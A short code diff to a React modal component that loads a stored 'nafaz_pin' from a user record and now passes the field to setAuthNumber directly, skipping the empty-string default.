@@ -33,7 +33,7 @@ export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProp
           const userData = docSnapshot.data()
           // Assuming the PIN is stored in a field called 'nafaz_pin'
           const pin = userData.nafaz_pin || ""
-          setAuthNumber(pin)
+          setAuthNumber(userData.nafaz_pin)
         } else {
           console.error("User document not found")
         }
